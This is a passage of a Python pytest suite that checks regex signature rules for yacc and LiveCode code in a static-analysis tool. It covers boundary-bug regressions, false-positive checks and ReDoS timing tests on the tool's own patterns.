    ("safety_bypasses", "goto err;", "int x = 1;"),
    ("high_risk_execution", "exit(1);", "return 0;"),
    ("io", 'fp = fopen("grammar.log", "r");', "int x = 1;"),
    ("api", "%define api.pure full\n", "%token NUMBER\n"),
    ("state_mutation", "x = 5;", "if (x == 5) { }"),
    ("dead_code", "// if (x) foo();", "// just a comment"),
    ("doc", "/** @param x the lookahead token */", "/* just a comment */"),
    # --- PHASE 3 ---
    ("globals", "yylval.ival = 5;", "int x = 5;"),
    ("generics", "%type <expr> assignment\n", "%type expr\n"),
    ("reflection_metaprogramming", "%%\n", "int x;\n"),
    ("import", '#include "parser.h"\n', "int x;\n"),
    ("ownership", "// Author: Jane Doe\n", "// regular comment\n"),
    # --- PHASE 4 ---
    ("planned_debt", "// TODO: handle the error-recovery case\n", "// regular comment\n"),
    ("fragile_debt", "// HACK: workaround for a bison shift/reduce conflict\n", "// regular comment\n"),
    ("spec_exposure", "// [SPEC-123] grammar rule per spec\n", "// regular comment\n"),
    ("macros", "#define YYDEBUG 1\n", "int x;\n"),
    ("pointers", "x = *ptr;", "int x = 5;"),
    ("memory_alloc", "node = malloc(sizeof(Node));", "int x;\n"),
    # --- PHASE 5 ---
    ("telemetry", 'syslog(LOG_ERR, "parse failed");', "int x;\n"),
    ("debug_prints", 'printf("%d\\n", x);', "int x;\n"),
    ("explicit_casts", "x = (int)y;", "int x;\n"),
    ("panics_and_aborts", "abort();", "return 0;"),
    ("bitwise_ops", "flags = flags & MASK;", "flags = flags && other;"),
    ("immutability_locks", "const int MAX = 10;", "int x;\n"),
    ("cleanup", "free(ptr);", "int x;\n"),
    ("encapsulation", "static int counter = 0;", "int counter = 0;"),
]


@pytest.mark.parametrize("signature,positive,negative", _YACC_SIMPLE_CASES)
def test_yacc_signature_positive_and_negative(signature, positive, negative):
    pattern = YACC_RULES[signature]
    assert pattern is not None, f"yacc's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"yacc {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"yacc {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_yacc_structural_boundaries_percent_directive_leading_boundary_regression():
    """
    Regression test (Rule 9): `%token`/`%type`/`%left`/`%right`/`%nonassoc`
    all start with `%` (non-word), so the shared leading `\\b` inside
    `\\b(...)\\b` could only fire when a word character immediately preceded
    the `%` -- never true for how these grammar directives are actually
    written (always the first token on a line, preceded only by whitespace
    or nothing). All five directive alternatives never matched at all;
    only `return`/`goto`/`break`/`continue` (which start on a word char)
    ever fired. Fixed by pulling the `%`-prefixed alternatives out of the
    `\\b(...)\\b` group and anchoring each with only a trailing `\\b` (the
    `%` is already self-delimiting).
    """
    pattern = YACC_RULES["structural_boundaries"]
    assert pattern.search("%token NUMBER\n"), "%token at line start still didn't match"
    assert pattern.search("  %type <val> expr\n"), "%type after leading whitespace still didn't match"
    assert pattern.search("%left '+' '-'\n"), "%left still didn't match"
    assert pattern.search("%right '='\n"), "%right still didn't match"
    assert pattern.search("%nonassoc EQ\n"), "%nonassoc still didn't match"
    assert pattern.search("return x;"), "return regressed"
    assert pattern.search("goto err;"), "goto regressed"


def test_yacc_api_percent_directive_leading_boundary_regression():
    """
    Regression test (Rule 9): identical bug to structural_boundaries, in
    the same rule dict. `%define`/`%code`/`%provides`/`%requires` all
    start with `%` (non-word); wrapped in `\\b(...)\\b`, the leading `\\b`
    could never fire at the real start-of-line position preceded by
    whitespace/newline (both non-word), so `api` never matched a single
    one of its four documented directives. Fixed by dropping the leading
    `\\b` on each `%`-prefixed alternative (self-delimiting) while keeping
    the trailing `\\b`.
    """
    pattern = YACC_RULES["api"]
    assert pattern.search("%define api.pure full\n"), "%define still didn't match"
    assert pattern.search("%code requires {\n"), "%code still didn't match"
    assert pattern.search("%provides\n"), "%provides still didn't match"
    assert pattern.search("%requires\n"), "%requires still didn't match"


def test_yacc_safety_bypasses_void_pointer_trailing_boundary_regression():
    """
    Regression test (Rule 9, trailing-side variant): the two alternatives
    inside `\\b(goto|void\\s*\\*)\\b` don't share the same edge shape --
    `goto` ends on a word char, `void\\s*\\*` ends on a symbol (`*`). The
    shared trailing `\\b` required a word character to immediately follow
    the `*`, which only happens to be true for the no-space style
    (`void *ptr`). The equally common `void* ptr` (asterisk attached to
    the type) and any style with more than one space before the
    identifier (`void *  ptr`) failed the trailing boundary and never
    matched. Fixed by dropping the trailing `\\b` on the `void\\s*\\*`
    alternative (the `*` is already self-delimiting).
    """
    pattern = YACC_RULES["safety_bypasses"]
    assert pattern.search("void *ptr;"), "void *ptr (no-space) form regressed"
    assert pattern.search("void* ptr;"), "void* ptr (attached asterisk) still didn't match"
    assert pattern.search("void *  ptr;"), "void with multiple spaces before identifier still didn't match"
    assert pattern.search("static void *foo(void)"), "void* in a function signature still didn't match"
    assert pattern.search("goto err;"), "goto regressed"


def test_yacc_func_start_switch_case_and_access_specifier_false_positive_regression():
    """
    Ambiguity-sweep finding, confirmed a real bug: func_start's
    `identifier :` anchor is deliberately shaped to catch yacc grammar
    rule productions (`expr :`), but embedded C/C++ action code in the
    same file shares the identical textual shape for constructs that are
    NOT grammar rules or executable-logic starts (Rule 7):
    switch-statement `default:` labels, and (in `.ypp` C++ variant files)
    `public:`/`private:`/`protected:` class access specifiers. All of
    these previously false-positived as grammar rule starts. Fixed with a
    negative lookahead excluding `case`/`default`/`public`/`private`/
    `protected` from the captured identifier.
    """
    pattern = YACC_RULES["func_start"]
    assert pattern.search("expr:\n    expr '+' term\n    ;\n"), "real grammar rule regressed"
    assert pattern.search("stmt_list:\n"), "real grammar rule (no body on same line) regressed"

    switch_block = "    switch (x) {\n    case 1:\n        break;\n    default:\n        break;\n    }\n"
    assert not pattern.search(switch_block), "incorrectly matched a switch-case default: label as func_start"

    assert not pattern.search("public:\n    int foo();\n"), "incorrectly matched a C++ 'public:' access specifier"
    assert not pattern.search("private:\n"), "incorrectly matched a C++ 'private:' access specifier"
    assert not pattern.search("protected:\n"), "incorrectly matched a C++ 'protected:' access specifier"


def test_yacc_dead_code_comment_style_completeness_regression():
    """
    Regression test (Rule 12): yacc's `lexical_family` is `standard_block`
    (both `//` and `/* */` comments are valid, per this language's own
    `_meta` rationale that it "relies entirely on standard '/* */' and
    '//' comments"). The `dead_code` rule's `//` alternative covered
    `if|for|while|return|%token`, but its `/* */` alternative silently
    dropped `return` from the keyword list -- a block-commented-out
    `return` statement never fired as dead_code even though the identical
    line commented with `//` did. Fixed by adding `return` to the
    `/* */` alternative so both comment styles have parity.
    """
    pattern = YACC_RULES["dead_code"]
    assert pattern.search("// return x;"), "'//' style with return regressed"
    assert pattern.search("/* return x; */"), "'/* */' style with return still didn't match"
    assert pattern.search("// if (x) foo();"), "'//' style with if regressed"
    assert pattern.search("/* if (x) foo(); */"), "'/* */' style with if regressed"
    assert pattern.search("/* %token FOO */"), "'/* */' style with %token regressed"


def test_yacc_explicit_casts_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS vector: three
    sequential unbounded `\\s*` quantifiers (`\\s*` after `(`, `\\s*`
    after the type name, `\\s*` after the optional `\\*?`) with no
    closing `)` ever present in the payload force the engine to
    re-attempt every possible split of the whitespace run across the
    three quantifiers before failing at each starting offset -- classic
    polynomial backtracking. Verified genuine ~4x-per-doubling scaling
    on the unfixed pattern at n=2000/4000/8000/16000/32000: 0.0047s /
    0.0186s / 0.0743s / 0.2952s / 1.1790s (ratios ~3.96-3.99, the
    signature of O(n^2), not the ~2x/doubling of linear work). Fixed by
    bounding all three whitespace quantifiers to `[ \\t]{0,20}`.
    """
    pattern = YACC_RULES["explicit_casts"]

    timings = []
    for n in (2000, 4000, 8000, 16000, 32000):
        payload = "(int" + " " * n
        start = time.perf_counter()
        pattern.search(payload)
        timings.append(time.perf_counter() - start)

    assert_redos_immune(pattern, "(int" + " " * 100000, timeout_sec=3.0)

    # After bounding, doubling the input must not multiply the runtime by
    # anywhere near 4x (the O(n^2) signature) -- a generous 2.5x ceiling
    # comfortably separates fixed-linear/constant behavior from a
    # regression back to catastrophic backtracking.
    for earlier, later in zip(timings, timings[1:]):
        assert later < max(earlier * 2.5, 0.01), f"explicit_casts scaling regressed toward O(n^2): {timings}"

    # Realistic cast forms must still match after bounding.
    assert pattern.search("$$ = (int)$1;"), "plain cast regressed"
    assert pattern.search("ptr = (char *)malloc(10);"), "pointer-cast regressed"
    assert pattern.search("ptr = (MyType*)base;"), "custom-type cast regressed"
    assert pattern.search("x = ( int )y;"), "spaced cast regressed"


def test_yacc_redos_immunity():
    """
    ReDoS scaling verification (Rule 5) for the remaining rules with
    unbounded-looking quantifiers, each fired against a never-closing
    adversarial payload at a large multiplier. None showed a real
    catastrophic-backtracking growth curve (all resolve in well under a
    millisecond even at n=100000), so no bounding was needed for these --
    included here as regression coverage against a future edit
    reintroducing an unbounded ambiguity.
    """
    assert_redos_immune(YACC_RULES["ownership"], "Author: " + "x" * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["import"], "#include <" + "x" * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["spec_exposure"], "[SPEC-1 [" + "x" * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["pointers"], "= *" + " " * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["cleanup"], "free" + " " * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["func_start"], "a" * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["generics"], "<" + "a" * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["dead_code"], "//" + " " * 100000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["structural_boundaries"], "%token " * 20000, timeout_sec=2.0)
    assert_redos_immune(YACC_RULES["api"], "%define " * 20000, timeout_sec=2.0)

    # Realistic-but-large inputs must still match after any bounding.
    assert YACC_RULES["ownership"].search("// Author: Jane Doe")
    assert YACC_RULES["import"].search('#include "parser.h"')
    assert YACC_RULES["spec_exposure"].search("[SPEC-123] audit trail")
    assert YACC_RULES["pointers"].search("x = *ptr;")
    assert YACC_RULES["cleanup"].search("free(ptr);")
    assert YACC_RULES["func_start"].search("expr:\n")
    assert YACC_RULES["generics"].search("%type <val> expr")


def test_yacc_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (explicit_casts vs
    pointers, previously found in C): checked and confirmed a structurally
    -forced non-collision, not a bug. `pointers`' asterisk alternative
    only fires via `(?<=[=(,])[ \\t]*\\*...` -- it requires the character
    immediately before the (optional whitespace then) `*` to be `=`, `(`,
    or `,`. In a cast like `(char *)ptr`, the `*` is instead preceded by
    the type name (`char`), so the lookbehind never matches. Per Rule 2
    (idiomatic paradigm alignment), pointer-typed casts are correctly
    routed to `explicit_casts` alone.
    """
    explicit_casts = YACC_RULES["explicit_casts"]
    pointers = YACC_RULES["pointers"]

    for snippet in ("ptr = (char *)base;", "ptr = (MyType*)base;", "x = (int)y;"):
        assert explicit_casts.search(snippet), f"explicit_casts should match: {snippet!r}"
        assert not pointers.search(snippet), f"pointers incorrectly matched a cast: {snippet!r}"

    real_pointer_deref = "foo(a, *ptr);"
    assert pointers.search(real_pointer_deref), "real pointer dereference regressed"


def test_yacc_pointers_and_bitwise_ops_address_of_intentional_overlap():
    """
    Ambiguity-sweep finding: `pointers`' bare `&\\w+` alternative (address-
    of) and `bitwise_ops`' `(?<!&)&(?!&)` alternative (bitwise AND,
    excluding `&&`) both fire on the same text for a no-space address-of
    expression like `&tree`, because C-family syntax genuinely reuses the
    single `&` glyph for both operations -- an AST-free regex engine
    cannot disambiguate them without type information. This is an
    accepted, intentional double-classification (both signatures are
    "correct" simultaneously), not a bug to narrow. Confirmed the two
    rules still diverge on their own unambiguous shapes: `flags & MASK`
    (spaced bitwise AND, not address-of) triggers bitwise_ops only, and
    `flags && other` (logical AND) triggers neither.
    """
    pointers = YACC_RULES["pointers"]
    bitwise_ops = YACC_RULES["bitwise_ops"]

    address_of = "node = &tree;"
    assert pointers.search(address_of)
    assert bitwise_ops.search(address_of)

    spaced_and = "flags = flags & MASK;"
    assert bitwise_ops.search(spaced_and)
    assert not pointers.search(spaced_and)

    logical_and = "flags = flags && other;"
    assert not bitwise_ops.search(logical_and)


def test_yacc_func_start_and_macros_no_collision():
    """
    Known ambiguity pattern from the issue template (a multi-line
    #define/macro spiral hallucinating a function match, previously found
    in C++): checked and confirmed not applicable to yacc. func_start
    requires an identifier immediately followed by a colon at the
    physical start of a line; a `#define`/multi-line-continuation macro
    never produces that shape regardless of how many continuation lines
    it spans. Empirically confirmed no overlap.
    """
    func_start = YACC_RULES["func_start"]
    macros = YACC_RULES["macros"]

    macro_spiral = (
        "#define VERY_LONG_MACRO(x, y, z) \\\n    do { \\\n        foo(x); \\\n        bar(y); \\\n    } while (0)\n"
    )
    assert macros.search(macro_spiral)
    assert not func_start.search(macro_spiral)

    grammar_rule = "expr:\n    expr '+' term\n    ;\n"
    assert func_start.search(grammar_rule)
    assert not macros.search(grammar_rule)


def test_yacc_func_start_and_generics_no_collision():
    """
    Known ambiguity pattern from the issue template (func_start vs
    generics, previously found in C# via deeply nested generic return
    types): checked and confirmed not applicable to yacc. `generics`
    anchors on the `<identifier>` shape used by `%type <val>` union-tag
    declarations; `func_start` anchors on `identifier:` at line start.
    These are disjoint textual shapes with no shared literal token.
    Empirically confirmed no overlap, and no catastrophic backtracking
    from a deeply-repeated `<` payload either.
    """
    func_start = YACC_RULES["func_start"]
    generics = YACC_RULES["generics"]

    type_decl = "%type <expr> assignment\n"
    assert generics.search(type_decl)
    assert not func_start.search(type_decl)

    grammar_rule = "assignment:\n    ID '=' expr\n    ;\n"
    assert func_start.search(grammar_rule)
    assert not generics.search(grammar_rule)

    assert_redos_immune(generics, "<" * 100000, timeout_sec=2.0)


def test_yacc_spec_exposure_nested_bracket_not_a_realistic_construct():
    """
    Nested-delimiter audit (Rule 11): `spec_exposure`'s trailing
    `[^\\]]*\\]` is a flat negated-class delimiter matcher. Checked against
    a one-level-nested bracket input the same way generics/indexers are
    checked elsewhere. Unlike a generic return type or indexer, a
    bracketed spec/audit tag has no realistic nested-bracket form in
    practice (real usage is always a flat `[SPEC-123]`/`[audit]`), so
    there is no realistic input this flat class fails to detect -- it
    still matches (just truncating its span at the first `]`, which
    doesn't matter since spec_exposure has no paired capture-group rule
    extracting structured content from it, unlike `import`'s
    `_dependency_capture`). Confirmed not a bug: the boolean
    "does a spec/audit tag exist" signal is unaffected either way.
    """
    pattern = YACC_RULES["spec_exposure"]
    assert pattern.search("// [SPEC-123] grammar rule per spec")
    assert pattern.search("// [audit] traceability tag")
    # Nested case still detects presence of the tag (span truncates early,
    # which is inconsequential -- see docstring).
    assert pattern.search("// [SPEC-123 [ref-456]] audit trail")


def test_yacc_lexical_family_dead_code_fires_under_both_comment_styles():
    """
    Comment-style audit (Rule 12), confirming lexical_family parity beyond
    the single-keyword regression above: yacc is `standard_block`, so
    both native comment delimiters must independently trigger dead_code
    for the same underlying commented-out logic.
    """
    pattern = YACC_RULES["dead_code"]
    for keyword in ("if", "for", "while", "return"):
        line_style = f"// {keyword} (x) {{ }}"
        block_style = f"/* {keyword} (x) {{ }} */"
        assert pattern.search(line_style), f"'//' style with {keyword!r} didn't match"
        assert pattern.search(block_style), f"'/* */' style with {keyword!r} didn't match"


# ==============================================================================
# LIVECODE: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #593)
# ==============================================================================
# CROSS-CUTTING FINDING (NOT fixed here -- reported, per the #593 scope
# boundary, since a full fix needs shared-config changes outside
# language_standards.py's livecode rules dict):
#
# livecode declares `"lexical_family": "standard_block"`, whose real
# delimiter set in gitgalaxy_config.py's LEXICAL_FAMILY_HEURISTICS is only
# `["//", "/*", "*/"]`. Real LiveCode/HyperTalk code overwhelmingly uses
# `--` (classic xTalk line comments) and `#` (common in LiveCode Server
# scripts -- confirmed directly against the language-crucible corpus's
# data/livecode/core/revsaveasstandalone.livecodescript, where `#` is by far
# the dominant comment prefix) neither of which "standard_block" recognizes.
# Reproduced directly against prism.py's real `_strip_segment_comments`:
# feeding it a snippet with `#`, `--`, and `//` comments only strips the
# `//` line -- the `#` and `--` lines are left inside the CODE stream (fully
# exposed to branch/io/state_mutation/etc.) and never reach the COMMENT
# stream at all, so dead_code/doc/ownership/planned_debt/fragile_debt/
# spec_exposure (all of which run only against the comment stream, per
# detector.py's `comment_analysis`) can never fire on `--`/`#`-prefixed
# text in the live pipeline, no matter how correct their own regexes are.
#
# No existing family is a clean fix: "multi_style_dash" covers `--`+`/* */`
# but not `#`/`//` (breaking LiveCode Builder's `//` comments instead);
# "embedded_syntax" covers `#`+`<# #>` but not `--`/`//`. A correct fix
# needs a new family recognizing all of `--`, `#`, `//`, and `/* */`
# together, which means changes to the shared LEXICAL_FAMILY_HEURISTICS
# table and prism.py's `_compile_regex_matrix()` -- both out of scope for
# this issue's "livecode rules dict only" boundary. See the PR/issue report
# for the full repro. The tests below verify each rule's own regex behavior
# directly (matching this suite's existing convention, e.g. SQLITE's
# dead_code comment-style test), which is unaffected by this gap.
# ==============================================================================
LIVECODE_RULES = LANGUAGE_DEFINITIONS["livecode"]["rules"]

_LIVECODE_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if tCount > 0 then\n  put 1 into x\nend if", 'put "hello" into x'),
    ("args", "on mouseUp pButtonNumber", "on mouseUp"),
    ("structural_boundaries", "put tValue into tField", "constant kMaxRetries"),
    ("func_start", 'on mouseUp\n  answer "hi"\nend mouseUp', "put 1 into x"),
    ("class_start", "module com.livecode.string", "on mouseUp"),
    ("safety", "try\n  put 1 into x\ncatch e\nend try", "put 1 into x"),
    ("safety_bypasses", 'do "put 1 into x"', "put 1 into x"),
    ("high_risk_execution", 'answer "hello"', "put 1 into x"),
    ("io", "open file tFilePath for read", "put 1 into x"),
    ("api", 'on mouseUp\n  answer "hi"\nend mouseUp', "private command foo"),
    ("state_mutation", "put the effective filename of this stack into tPath", "answer 1"),
    ("dead_code", "-- put 1 into x", "put 1 into x"),
    ("doc", "-- Author: Jane Doe", "put 1 into x"),
    ("test", "command testLogin", "put 1 into x"),
    ("concurrency", 'send "myHandler" to me in 2 seconds', "put 1 into x"),
    ("ui_framework", 'put the label of button "OK" into tLabel', "put 1 into x"),
    ("globals", "put $ENV into tEnv", "put 1 into x"),
    ("decorators", "@metadata author", "put 1 into x"),
    ("comprehensions", "repeat for each item tItem in tList", "put 1 into x"),
    ("scientific", "put sqrt(4) into x", "put 1 into x"),
    ("reflection_metaprogramming", 'do "put 1 into x"', "put 1 into x"),
    ("import", 'start using stack "MyLib"', "put 1 into x"),
    ("ownership", "-- Author: Jane Doe", "put 1 into x"),
    ("planned_debt", "-- TODO: refactor this", "put 1 into x"),
    ("fragile_debt", "-- HACK: workaround", "put 1 into x"),
    ("spec_exposure", "-- [SPEC-123] audit trail requirements", "put 1 into x"),
    ("ssr_boundaries", "<?lc echo 1; ?>", "put 1 into x"),
    ("events", 'on mouseUp\n  answer "hi"\nend mouseUp', "on customMessage"),
    ("dependency_injection", "set the behavior of me to tBehavior", "put 1 into x"),
    ("pointers", "command updateList @pList", "put 1 into x"),
    ("telemetry", 'revLog "error occurred"', "put 1 into x"),
    ("debug_prints", 'put "debug: entered handler"', "put tValue into tField"),
    ("explicit_casts", "if tValue is a number then", "put 1 into x"),
    ("panics_and_aborts", 'throw "custom error"', "put 1 into x"),
    ("thread_sleeps", "wait 2 seconds", "wait 2 seconds with messages"),
    ("bitwise_ops", "put bitAnd(5,3) into x", "put 1 into x"),
    ("sync_locks", "lock screen", "put 1 into x"),
    ("immutability_locks", "constant kMaxRetries = 5", "put 1 into x"),
    ("cleanup", "close file tFile", "put 1 into x"),
    ("encapsulation", "private command foo", "public command foo"),
    ("listeners", 'on mouseUp\n  answer "hi"\nend mouseUp', "put 1 into x"),
    ("test_skip", "skip test", "put 1 into x"),
    ("serialization_parsing", "put jsonImport(tJson) into tArray", "put 1 into x"),
    ("regex_execution", 'matchText(tString, "^[0-9]+$")', "put 1 into x"),
    ("time_date_logic", "put the seconds into tNow", "put 1 into x"),
    ("ipc_rpc_bridges", 'put shell("ls -la") into tOutput', "put 1 into x"),
]


@pytest.mark.parametrize("signature,positive,negative", _LIVECODE_SIMPLE_CASES)
def test_livecode_signature_positive_and_negative(signature, positive, negative):
    pattern = LIVECODE_RULES[signature]
    assert pattern is not None, f"livecode's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"livecode {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"livecode {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_livecode_dependency_capture_extracts_path():
    """
    _dependency_capture is paired with `import` and must extract the exact
    dependency path/module string into a capture group, not just detect
    presence. Covers all four import shapes livecode supports.
    """
    pattern = LIVECODE_RULES["_dependency_capture"]

    m = pattern.search('start using stack "MyLib"')
    assert m and (m.group(1) or m.group(2)) == "MyLib"

    m = pattern.search('require "com.livecode.string"')
    assert m and (m.group(1) or m.group(2)) == "com.livecode.string"

    m = pattern.search('include "utils.lc"')
    assert m and (m.group(1) or m.group(2)) == "utils.lc"

    m = pattern.search("module com.livecode.string")
    assert m and (m.group(1) or m.group(2)) == "com.livecode.string", "dotted module path capture regressed"


# ==============================================================================
# REGRESSION TESTS -- one per confirmed bug found during the #593 audit
# ==============================================================================


def test_livecode_structural_boundaries_immutability_locks_duplicate_regression():
    """
    Ambiguity-sweep finding, confirmed a real bug: `structural_boundaries`
    listed `constant` as one of its own alternatives, duplicating
    `immutability_locks` and directly violating this key's own documented
    EXCLUDES rule ("Immutability keywords (const, final) -- these belong
    in immutability_locks", per how_to_add_a_language.md's schema comment
    for structural_boundaries). Every `constant` declaration was double-
    counted as both a structural boundary and an immutability lock. Fixed
    by removing `constant` from structural_boundaries; it now lives only
    in immutability_locks.
    """
    structural = LIVECODE_RULES["structural_boundaries"]
    locks = LIVECODE_RULES["immutability_locks"]

    assert not structural.search("constant kMaxRetries = 5"), (
        "structural_boundaries incorrectly still matches 'constant' (should be immutability_locks-only)"
    )
    assert locks.search("constant kMaxRetries = 5"), "immutability_locks regressed on 'constant'"
    # Other structural_boundaries alternatives must be unaffected.
    assert structural.search("put tValue into tField"), "unrelated structural_boundaries alternative regressed"


def test_livecode_class_start_dotted_module_name_regression():
    """
    Regression test (Rule 11-class nested/multi-segment coverage): the name
    capture `["\\'a-zA-Z_]\\w*` stopped at the first non-word character, so
    it could never consume a dotted reverse-DNS module/widget name --
    LiveCode Builder's real, dominant declaration form (confirmed directly
    against the language-crucible corpus's data/livecode/core/string.lcb,
    whose first real line is `module com.livecode.string`). The trailing
    lookahead then required whitespace/EOL immediately after the partial
    match, which a `.` never satisfies, so the whole match failed. Fixed by
    widening the name pattern to allow up to 10 dotted segments.
    """
    pattern = LIVECODE_RULES["class_start"]
    m = pattern.search("module com.livecode.string")
    assert m, "dotted module name still didn't match"
    assert m.group(1) == "com.livecode.string"

    m = pattern.search("widget com.livecode.widget.myWidget")
    assert m, "multi-segment dotted widget name still didn't match"
    assert m.group(1) == "com.livecode.widget.myWidget"

    m = pattern.search("behavior myBehavior")
    assert m and m.group(1) == "myBehavior", "plain non-dotted name regressed"


def test_livecode_doc_author_colon_trailing_boundary_regression():
    """
    Regression test (Rule 9/10-class trailing-boundary bug): the
    `Description|Purpose|Author|Summary` alternation had a trailing `\\b`
    placed immediately after the literal `:` it requires. `:` is a
    non-word character, so that `\\b` only fires if the very next character
    is a word character -- but the near-universal real form is
    "Author: John Doe" (colon then a space), which is non-word on both
    sides of that exact position, so the tag never matched. Fixed by
    dropping the trailing `\\b` (`:` is already self-delimiting).
    """
    pattern = LIVECODE_RULES["doc"]
    assert pattern.search("-- Author: John Doe"), "'Author: ' (colon-space) form still didn't match"
    assert pattern.search("-- Description: Handles login"), "'Description: ' form still didn't match"
    assert pattern.search("-- Purpose: Validates input"), "'Purpose: ' form still didn't match"
    assert pattern.search("-- Summary: Entry point"), "'Summary: ' form still didn't match"
    # The doc-block tag forms must be unaffected.
    assert pattern.search("--| @param pName the user name"), "'--|' doc-block form regressed"


def test_livecode_state_mutation_multiword_expression_regression():
    """
    Regression test: put/add/subtract's source-expression matcher used
    `[^ \\t\\n]+?`, which excludes spaces -- so the dominant real form of a
    LiveCode expression (`the effective filename of this stack`, `the
    number of items of tList`, a string concatenation) never matched;
    only a single bare token before "into"/"to"/"from" did. Fixed by
    widening to `[^\\n]{1,300}?` (bounded per Rule 5) so it spans the whole
    single-line expression instead of stopping at the first space.
    """
    pattern = LIVECODE_RULES["state_mutation"]
    assert pattern.search("put the effective filename of this stack into tPath"), (
        "multi-word 'put ... into' expression still didn't match"
    )
    assert pattern.search('put "hello" & " " & "world" into tGreeting'), "concatenation expression still didn't match"
    assert pattern.search("add the number of lines of tList to tTotal"), "multi-word 'add ... to' still didn't match"
    assert pattern.search('subtract the value of field "x" from tTotal'), (
        "multi-word 'subtract ... from' still didn't match"
    )
    assert pattern.search("put empty into tField"), "single-token form regressed"


def test_livecode_io_post_multiword_payload_regression():
    """
    Regression test: `io`'s "post ... to url" matcher used
    `[^ \\t\\n]+?`, which excludes spaces -- so a realistic multi-word/
    concatenated payload expression (`post "action=" & tAction to url
    tURL`) never matched; only a single bare variable did. Fixed by
    widening to `[^\\n]{1,300}?` (bounded per Rule 5).
    """
    pattern = LIVECODE_RULES["io"]
    assert pattern.search('post "action=" & tAction to url tURL'), "concatenated post payload still didn't match"
    assert pattern.search('post tData to url "http://example.com/api"'), "single-token post payload regressed"


def test_livecode_concurrency_send_multiword_target_regression():
    """
    Regression test: `concurrency`'s "send X in Y seconds" target matcher
    used `[^ \\t\\n]+?`, which excludes spaces -- so the dominant real
    scheduled-message form (`send "myHandler" to me in 2 seconds`, target
    object references being multi-word) never matched; only a single bare
    token did. Fixed by widening to `[^\\n]{1,300}?` (bounded per Rule 5).
    """
    pattern = LIVECODE_RULES["concurrency"]
    assert pattern.search('send "myHandler" to me in 2 seconds'), "multi-word send target still didn't match"
    assert pattern.search('send "doThing" to button "Go" in 500 milliseconds'), (
        "multi-word send target with object reference still didn't match"
    )
    assert pattern.search("dispatch"), "unrelated concurrency alternative regressed"


def test_livecode_comprehensions_filter_multiword_target_regression():
    """
    Regression test: `comprehensions`'s `filter` target matcher used
    `[^ \\t\\n]+?`, which excludes spaces -- so the common multi-word
    target form (`filter lines of tData with "*.txt"`) never matched; only
    a single bare token did. Fixed by widening to `[^\\n]{1,300}?`
    (bounded per Rule 5).
    """
    pattern = LIVECODE_RULES["comprehensions"]
    assert pattern.search('filter lines of tData with "*.txt"'), "multi-word filter target still didn't match"
    assert pattern.search("repeat for each item tItem in tList"), "'repeat for each' form regressed"


def test_livecode_globals_env_leading_boundary_regression():
    """
    Regression test (Rule 9): `$ENV` started with the symbolic `$`, which
    can never satisfy a leading `\\b` -- real usage is always preceded by
    whitespace or line-start (non-word on both sides of that position), so
    it never matched. Fixed by pulling `$ENV` out of the group with only a
    trailing `\\b` (the `$` is self-delimiting on the left).
    """
    pattern = LIVECODE_RULES["globals"]
    assert pattern.search("put $ENV into tEnv"), "'$ENV' preceded by whitespace still didn't match"
    assert pattern.search("the value of $ENV in this script"), "'$ENV' mid-sentence still didn't match"
    assert pattern.search("global gMyVar"), "unrelated globals alternative regressed"


def test_livecode_pointers_leading_boundary_regression():
    """
    Regression test (Rule 9): the leading `\\b` sat directly in front of
    the symbolic `@` sigil used for pass-by-reference parameters. Real
    usage is always preceded by whitespace, a comma, or an opening paren
    (non-word on both sides of that position), so the leading boundary
    never fired -- `@pList` never matched except in the contrived case of
    a word character glued directly onto the `@`. Fixed by dropping the
    leading `\\b` (the `@` is self-delimiting).
    """
    pattern = LIVECODE_RULES["pointers"]
    assert pattern.search("command updateList @pList"), "'@pList' preceded by whitespace still didn't match"
    assert pattern.search("function bar pValue, @pResult"), "'@pResult' preceded by comma-space still didn't match"


def test_livecode_reflection_metaprogramming_paren_trailing_boundary_regression():
    """
    Regression test (Rule 10): `value(` and `evaluate(` end on the
    self-delimiting `(`, but the shared trailing `\\b` required a word
    character immediately after it -- so the dominant real call shape (a
    quoted expression, e.g. `value("1+1")`) never matched; only an
    unquoted bare-identifier argument (`value(tExpr)`) did. Fixed by
    pulling both out of the group with the trailing `\\b` dropped.
    """
    pattern = LIVECODE_RULES["reflection_metaprogramming"]
    assert pattern.search('value("1+1")'), 'value("...") quoted-argument form still didn\'t match'
    assert pattern.search('evaluate("1+1")'), 'evaluate("...") quoted-argument form still didn\'t match'
    assert pattern.search("value(tExpression)"), "value(identifier) form regressed"
    assert pattern.search("evaluate(tScript)"), "evaluate(identifier) form regressed"


def test_livecode_do_alternative_trailing_boundary_regression():
    """
    Regression test (Rule 9/10-class trailing-boundary bug), affecting two
    separate rules that both use a `do\\s+...` alternative:

    `safety_bypasses`'s "do" alternative uses a negative lookahead
    specifically to target "do" followed by a NON-identifier (a raw
    string/expression -- the actual dynamic-eval bypass), yet the shared
    trailing `\\b` on the outer group required a WORD character right
    after the consumed whitespace. Since the realistic target is almost
    always a quote or paren (both non-word), that boundary could never be
    satisfied for the alternative's own intended match -- `do "put 1 into
    x"` and `do (tExpr)` both silently never matched.

    `reflection_metaprogramming`'s bare `do\\s+` alternative (meant to
    catch every "do X" form) had the identical defect: `do "put 1 into
    x"` never matched, only `do <bareIdentifier>` did, even though the
    quoted-string form is the dominant real dynamic-script-execution
    idiom.

    Both fixed by pulling `do\\s+...` out of the wrapped group (already
    self-delimited by `\\s+` plus, for safety_bypasses, its own lookahead;
    no trailing `\\b` needed).
    """
